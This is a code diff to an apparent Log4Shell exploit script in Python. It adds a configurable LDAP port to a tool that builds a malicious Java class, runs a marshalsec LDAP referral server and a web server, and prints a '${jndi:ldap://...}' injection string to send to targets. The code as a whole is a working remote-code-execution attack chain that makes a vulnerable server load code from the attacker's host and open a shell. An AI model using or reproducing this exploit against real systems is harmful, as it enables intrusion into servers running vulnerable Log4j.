@@ -67,13 +67,13 @@ public class Exploit {
         print(Fore.GREEN + '[+] Exploit java class created success')
 
 
-def payload(userip: str, webport: int, lport: int) -> None:
+def payload(userip: str, ldapport: int, webport: int, lport: int) -> None:
     generate_payload(userip, lport)
 
     print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
     # create the LDAP server on new thread
-    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
+    t1 = threading.Thread(target=ldap_server, args=(userip, ldapport, webport))
     t1.start()
 
     # start the web server
@@ -90,8 +90,8 @@ def check_java() -> bool:
     return exit_code == 0
 
 
-def ldap_server(userip: str, lport: int) -> None:
-    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
+def ldap_server(userip: str, ldapport: int, lport: int) -> None:
+    sendme = "${jndi:ldap://%s:%i/a}" % (userip, ldapport)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
@@ -101,6 +101,7 @@ def ldap_server(userip: str, lport: int) -> None:
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
         url,
+        str(ldapport)
     ])
 
 
@@ -117,6 +118,11 @@ def main() -> None:
                         type=str,
                         default='localhost',
                         help='Enter IP for LDAPRefServer & Shell')
+    parser.add_argument('--ldapport',
+                        metavar='ldapport',
+                        type=int,
+                        default='1389',
+                        help='listener port for LDAP server')
     parser.add_argument('--webport',
                         metavar='webport',
                         type=int,
@@ -134,7 +140,7 @@ def main() -> None:
         if not check_java():
             print(Fore.RED + '[-] Java is not installed inside the repository')
             raise SystemExit(1)
-        payload(args.userip, args.webport, args.lport)
+        payload(args.userip, args.ldapport, args.webport, args.lport)
     except KeyboardInterrupt:
         print(Fore.RED + "user interrupted the program.")
         raise SystemExit(0)
